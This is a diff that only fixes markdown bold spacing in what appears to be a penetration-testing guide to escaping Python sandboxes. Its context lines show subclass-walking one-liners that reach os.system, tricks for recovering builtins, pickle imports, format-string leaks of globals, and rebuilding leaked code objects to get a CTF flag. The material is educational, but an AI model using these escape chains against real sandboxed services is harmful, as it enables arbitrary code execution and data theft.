@@ -45,7 +45,7 @@ Remember that the _**open**_ and _**read**_ functions can be useful to **read fi
 **Python2 input()** function allows to execute python code before the program crashes.
 {% endhint %}
 
-Python try to **load libraries from the current directory first **(the following command will print where is python loading modules from): `python3 -c 'import sys; print(sys.path)'`
+Python try to **load libraries from the current directory first** (the following command will print where is python loading modules from): `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../.gitbook/assets/image (552).png>)
 
@@ -54,7 +54,7 @@ Python try to **load libraries from the current directory first **(the following
 ### Default packages
 
 You can find a **list of pre-installed** packages here: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-Note that from a pickle you can make the python env** import arbitrary libraries** installed in the system.\
+Note that from a pickle you can make the python env **import arbitrary libraries** installed in the system.\
 For example the following pickle, when loaded, is going to import the pip library to use it:
 
 ```python
@@ -131,7 +131,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ### No Builtins
 
 When you don't have `__builtins__` you are not going to be able to import anything nor even read or write files as **all the global functions** (like `open`, `import`, `print`...) **aren't loaded**.\
-However, **by default python import a lot of modules in memory**. This modules may seem benign, but some of them are **also importing dangerous **functionalities inside of them that can be accessed to gain even **arbitrary code execution**.
+However, **by default python import a lot of modules in memory**. This modules may seem benign, but some of them are **also importing dangerous** functionalities inside of them that can be accessed to gain even **arbitrary code execution**.
 
 In the following examples you can observe how to **abuse** some of this "**benign**" modules loaded to **access** **dangerous** **functionalities** inside of them.
 
@@ -175,7 +175,7 @@ get_flag.__globals__['__builtins__']
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
 
-[**Below there is a bigger function**](./#recursive-search-of-builtins-globals) to find tens/**hundreds **of **places **were you can find the **builtins**.
+[**Below there is a bigger function**](./#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **builtins**.
 
 #### Python2 and Python3
 
@@ -223,11 +223,11 @@ class_obj.__init__.__globals__
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
 
-[**Below there is a bigger function**](./#recursive-search-of-builtins-globals) to find tens/**hundreds **of **places **were you can find the **globals**.
+[**Below there is a bigger function**](./#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **globals**.
 
 ## Discover Arbitrary Execution
 
-Here I want to explain how to easily discover** more dangerous functionalities loaded **and propose more reliable exploits.
+Here I want to explain how to easily discover **more dangerous functionalities loaded** and propose more reliable exploits.
 
 #### Accessing subclasses with bypasses
 
@@ -267,13 +267,13 @@ For example, knowing that with the library **`sys`** it's possible to **import a
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
 
-There are a lot, and** we just need one** to execute commands:
+There are a lot, and **we just need one** to execute commands:
 
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
 
-We can do the same thing with** other libraries** that we know can be used to** execute commands**:
+We can do the same thing with **other libraries** that we know can be used to **execute commands**:
 
 ```python
 #os
@@ -331,7 +331,7 @@ pdb:
 """
 ```
 
-Moreover, if you think **other libraries** may be able to** invoke functions to execute commands**, we can also **filter by functions names** inside the possible libraries:
+Moreover, if you think **other libraries** may be able to **invoke functions to execute commands**, we can also **filter by functions names** inside the possible libraries:
 
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
@@ -496,7 +496,7 @@ You can check the output of this script in this page:
 
 ## Python Format String
 
-If you **send **a **string **to python that is going to be **formatted**, you can use `{}` to access **python internal information. **You can use the previous examples to access globals or builtins for example.
+If you **send** a **string** to python that is going to be **formatted**, you can use `{}` to access **python internal information.** You can use the previous examples to access globals or builtins for example.
 
 {% hint style="info" %}
 However, there is a **limitation**, you can only use the symbols `.[]`, so you **won't be able to execute arbitrary code**, just to read information. \
@@ -523,7 +523,7 @@ st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
 
-Note how you can **access attributes **in a normal way with a **dot **like `people_obj.__init__` and **dict element **with **parenthesis **without quotes `__globals__[CONFIG]`
+Note how you can **access attributes** in a normal way with a **dot** like `people_obj.__init__` and **dict element** with **parenthesis** without quotes `__globals__[CONFIG]`
 
 Also note that you can use `.__dict__` to enumerate elements of an object `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
@@ -730,7 +730,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## Compiling Python
 
 Now, lets imagine that somehow you can **dump the information about a function that you cannot execute** but you **need** to **execute** it.\
-Like in the following example, you **can access the code object **of that function, but just reading the disassemble you **don't know how to calculate the flag** (_imagine a more complex `calc_flag` function_)
+Like in the following example, you **can access the code object** of that function, but just reading the disassemble you **don't know how to calculate the flag** (_imagine a more complex `calc_flag` function_)
 
 ```python
 def get_flag(some_input):
@@ -770,7 +770,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ### Recreating a leaked function
 
 {% hint style="warning" %}
-In the following example we are going to take all the data needed to recreate the function from the function code object directly. In a** real example**, all the **values** to execute the function **`code_type`** is what **you will need to leak**.
+In the following example we are going to take all the data needed to recreate the function from the function code object directly. In a **real example**, all the **values** to execute the function **`code_type`** is what **you will need to leak**.
 {% endhint %}
 
 ```python
@@ -830,7 +830,7 @@ f(42)
 
 ## Decompiling Compiled Python
 
-Using tools like [**https://www.decompiler.com/**](https://www.decompiler.com)** **one can **decompile** given compiled python code
+Using tools like [**https://www.decompiler.com/**](https://www.decompiler.com) **** one can **decompile** given compiled python code
 
 ## References
 
